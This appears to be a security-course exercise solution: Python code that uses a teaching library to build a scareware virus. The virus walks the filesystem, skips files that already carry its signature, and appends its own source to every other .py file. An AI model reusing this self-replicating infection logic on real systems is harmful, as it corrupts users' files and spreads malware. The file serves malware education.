# Implement a scareware virus that infects all Python files on the system. The virus should
# avoid infecting the same file multiple times.
#
# Note: follow the instructions in "utils/create_fs.py"

from issp import Malware, Propagation, Scareware, System, log


class PyVirus(Propagation):
    def propagate(self, system: System) -> None:
        code = system.own_path.read_bytes()
        for path in system.path("/").walk():
            if path.is_file() and path.name.endswith(".py"):
                previous_code = path.read_bytes()
                if b"class PyVirus(Propagation)" in previous_code:
                    log.info("Already infected: %s", path)
                else:
                    log.info("Infecting: %s", path)
                    path.write_bytes(previous_code + b"\n" + code)


def main() -> None:
    malware = Malware(payload=Scareware(), propagation=PyVirus())
    malware.execute()


if __name__ == "__main__":
    main()
